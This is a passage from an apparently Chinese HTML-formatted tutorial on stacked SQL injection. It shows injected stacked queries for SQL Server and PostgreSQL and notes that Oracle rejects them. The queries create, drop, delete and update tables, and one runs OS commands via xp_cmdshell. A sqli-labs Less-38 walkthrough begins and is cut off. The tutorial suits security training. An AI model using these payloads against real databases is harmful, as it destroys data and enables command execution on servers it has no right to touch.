0);display: inline;width: 33px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'new'</span>,<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'new'</span>);</code></pre></section><p><img class="" data-ratio="0.2558139534883721" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/8_T78GJUjK0vejFNRafxCicnWOrg93yA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGKPEIib5pDJIbdkI4aiaIuCWa28lT78GJUjK0vejFNRafxCicnWOrg93yA/640?wx_fmt=gif'" data-type="gif" data-w="645" height="165" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;" width="645"  /></p><p><img class="" data-ratio="0.6784232365145229" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/9_N19PlHpuN67C59DQwnLrlmBUyXMhrw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XG3ceicR5OKDKROSDbH4LBTEBNeN19PlHpuN67C59DQwnLrlmBUyXMhrw/640?wx_fmt=gif'" data-type="gif" data-w="482" height="327" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;width: 100%;height: auto;" width="482" data-backw="482" data-backh="327" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XG3ceicR5OKDKROSDbH4LBTEBNeN19PlHpuN67C59DQwnLrlmBUyXMhrw/640?wx_fmt=gif"  /></p><h2><span style="font-size:14px;line-height:34px;;">2. Sql server</span></h2><p><span style="font-size:14px;line-height:34px;;">(1)增加数据表</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">test</span>;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">create</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> sc3(ss <span class="hljs-default-built_in" style="color: rgb(230, 192, 123);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(230, 192, 123);font-weight: 400;font-style: normal;">CHAR</span>(<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">8</span>));</code></pre></section><p><img class="" data-ratio="0.8786039453717754" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/10_MqVDU0tHyDeNQIQ5gUHZTicbdPjy6Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGUlwUAGib0O1XelPJl6ontE1gMDMqVDU0tHyDeNQIQ5gUHZTicbdPjy6Q/640?wx_fmt=gif'" data-type="gif" data-w="659" height="579" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;" width="659"  /></p><p><span style="font-size:14px;line-height:34px;;">(2) 删除数据表</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">test</span>;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">drop</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> sc3;</code></pre></section><p><img class="" data-ratio="0.8940092165898618" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/11_JIx36tTmHSnMlge9JBp4MuTKx8oPcA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGTrResgpz6NkRB2xl7egD5ic6vJIx36tTmHSnMlge9JBp4MuTKx8oPcA/640?wx_fmt=gif'" data-type="gif" data-w="651" height="582" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;" width="651"  /></p><p><span style="font-size:14px;line-height:34px;;">(4)查询数据</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1</span>,<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">2</span>,<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">3</span>;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">test</span>;</code></pre></section><p><img class="" data-ratio="0.6340852130325815" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/12_NmF2C1BBtxficURSUdORtHKibgCKLQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XG3asx6JwCKvZO3vU1Aibbp4r2rtNNmF2C1BBtxficURSUdORtHKibgCKLQ/640?wx_fmt=gif'" data-type="gif" data-w="399" height="253" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;width: 100%;height: auto;" width="399" data-backw="399" data-backh="253" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XG3asx6JwCKvZO3vU1Aibbp4r2rtNNmF2C1BBtxficURSUdORtHKibgCKLQ/640?wx_fmt=gif"  /></p><p><span style="font-size:14px;line-height:34px;;">(5)修改数据</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">test</span>;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">update</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">test</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 20px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">set</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">name</span>=<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'test'</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">where</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>=<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 7px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">3</span>;</code></pre></section><p><img class="" data-ratio="1.3664302600472813" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/13_ozmt5vYtQtDbJHIylq7OfY6R07Duzg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGeeqveNur0mKbjdyA2C6IcdyTozmt5vYtQtDbJHIylq7OfY6R07Duzg/640?wx_fmt=gif'" data-type="gif" data-w="423" height="578" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;width: 100%;height: auto;" width="423" data-backw="423" data-backh="578" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGeeqveNur0mKbjdyA2C6IcdyTozmt5vYtQtDbJHIylq7OfY6R07Duzg/640?wx_fmt=gif"  /></p><p><img class="" data-ratio="1.0575539568345325" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/14_nvzcibmIqEJ5Kj2XTcKBYW52pXbjIw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGXcHicx2yAwbhPrSSvXMhs5bWuRnvzcibmIqEJ5Kj2XTcKBYW52pXbjIw/640?wx_fmt=gif'" data-type="gif" data-w="417" height="441" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;width: 100%;height: auto;" width="417" data-backw="417" data-backh="441" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGXcHicx2yAwbhPrSSvXMhs5bWuRnvzcibmIqEJ5Kj2XTcKBYW52pXbjIw/640?wx_fmt=gif"  /></p><p><span style="font-size:14px;line-height:34px;;">(5)sqlserver中最为重要的存储过程的执行</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">test</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">where</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>=<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1</span>;exec master..xp_cmdshell 'ipconfig'</code></pre></section><p><img class="" data-ratio="0.9012345679012346" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/15_yMtuWRuQ47SvzYcoNOUTb2BTGYYVVA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGicjmnxOXMvw57V2Tqe1h5eQsAyMtuWRuQ47SvzYcoNOUTb2BTGYYVVA/640?wx_fmt=gif'" data-type="gif" data-w="648" height="584" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;" width="648"  /></p><h2><span style="font-size:14px;line-height:34px;;">3.Oracle</span></h2><p><span style="font-size:14px;line-height:34px;;">上面的介绍中我们已经提及，oracle不能使用堆叠注入，可以从图中看到，当有两条语句在同一行时，直接报错。</span><span style="font-size:14px;line-height:34px;;">无效字符。</span><span style="font-size:14px;line-height:34px;;">后面的就不往下继续尝试了。</span></p><p><img class="" data-ratio="0.1368584758942457" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/16_A0DJxHqLA1T80S8C269aibKI6R4SAA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGOnfI8CQDbVicfwXXStRRpJ8GgaA0DJxHqLA1T80S8C269aibKI6R4SAA/640?wx_fmt=gif'" data-type="gif" data-w="643" height="88" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;" width="643"  /></p><h2><span style="font-size:14px;line-height:34px;;">4.Postgresql</span></h2><p><span style="font-size:14px;line-height:34px;;">(1)新建一个表&nbsp;&nbsp;</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> user_test;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">create</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 59px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">user_data</span>(<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span> <span class="hljs-default-built_in" style="color: rgb(230, 192, 123);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(230, 192, 123);font-weight: 400;font-style: normal;">DATE</span>);</code></pre></section><p><img class="" data-ratio="0.24447513812154695" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/17_BWaCogCofTSiaQiblYXoeCibq2j8GA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XG6orLVbmP70OHna9cUwxYSdTyZkxBWaCogCofTSiaQiblYXoeCibq2j8GA/640?wx_fmt=gif'" data-type="gif" data-w="724" height="177" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;width: 100%;height: auto;" width="724" data-backw="556" data-backh="136" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XG6orLVbmP70OHna9cUwxYSdTyZkxBWaCogCofTSiaQiblYXoeCibq2j8GA/640?wx_fmt=gif"  /></p><p><img class="" data-ratio="0.17227722772277226" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/18_uRAB5A2yK0kHIiaokicIuXVho1xibg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XG7ZzMqpd2x1QfooGicwSDOOFibiccxMuRAB5A2yK0kHIiaokicIuXVho1xibg/640?wx_fmt=gif'" data-type="gif" data-w="505" height="87" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;width: 100%;height: auto;" width="505" data-backw="505" data-backh="87" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XG7ZzMqpd2x1QfooGicwSDOOFibiccxMuRAB5A2yK0kHIiaokicIuXVho1xibg/640?wx_fmt=gif"  /></p><p><span style="font-size:14px;line-height:34px;;">可以看到user_data表已经建好。</span></p><p><span style="font-size:14px;line-height:34px;;">(2)删除上面新建的user_data表</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> user_test;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">delete</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 58px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">user_data</span>;</code></pre></section><p><img class="" data-ratio="0.2541899441340782" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/19_UIDk8I8d2QtNicicjnHZib6yLAmQqA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGicibefFELZWNQxQ7dkZoQUJK48W6fUIDk8I8d2QtNicicjnHZib6yLAmQqA/640?wx_fmt=gif'" data-type="gif" data-w="716" height="182" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;width: 100%;height: auto;" width="716" data-backw="556" data-backh="142" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGicibefFELZWNQxQ7dkZoQUJK48W6fUIDk8I8d2QtNicicjnHZib6yLAmQqA/640?wx_fmt=gif"  /></p><p><span style="font-size:14px;line-height:34px;;">(3)查询数据</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> user_test;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1</span>,<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 7px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">2</span>,<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">3</span>;</code></pre></section><p><img class="" data-ratio="0.4206081081081081" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/20_H4TicNvdnty7rWg5Lnia0OfBtsCdRA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGAcI74cibXQjP2B5gFq6S5JicKhcjH4TicNvdnty7rWg5Lnia0OfBtsCdRA/640?wx_fmt=gif'" data-type="gif" data-w="592" height="249" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;width: 100%;height: auto;" width="592" data-backw="556" data-backh="234" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGAcI74cibXQjP2B5gFq6S5JicKhcjH4TicNvdnty7rWg5Lnia0OfBtsCdRA/640?wx_fmt=gif"  /></p><p><span style="font-size:14px;line-height:34px;;">(4) 修改数据</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> user_test;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">update</span> user_test <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 19px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">set</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">name</span>=<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 53px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'modify'</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">where</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">name</span>=<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 37px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'张三'</span>;</code></pre></section><p><img class="" data-ratio="0.4811715481171548" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/21_KEYVXoIwkkvZGuuLShXKv5DCMxuljA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGHRl3n7P9CLcuFZXVE4aZIRXGKEYVXoIwkkvZGuuLShXKv5DCMxuljA/640?wx_fmt=gif'" data-type="gif" data-w="717" height="345" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;width: 100%;height: auto;" width="717" data-backw="556" data-backh="267" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGHRl3n7P9CLcuFZXVE4aZIRXGKEYVXoIwkkvZGuuLShXKv5DCMxuljA/640?wx_fmt=gif"  /></p><p><span style="font-size:14px;line-height:34px;;">&nbsp;</span></p><h2><span style="font-size:18px;line-height:38px;;"><strong>0x04 堆叠注入之sqllaps实例</strong></span></h2><p><span style="font-size:14px;line-height:34px;;">&nbsp;</span></p><h2><span style="font-size:16px;line-height:36px;;"><strong>1.Less-38 堆叠注入&nbsp;-&nbsp;字符型 - GET</strong></span></h2><p><span style="font-size:14px;line-height:34px;;">（1）源代码</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">$sql="<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">SELECT</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">FROM</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">WHERE</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>=<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'$id'</span> <span class="hljs-default-keyword" 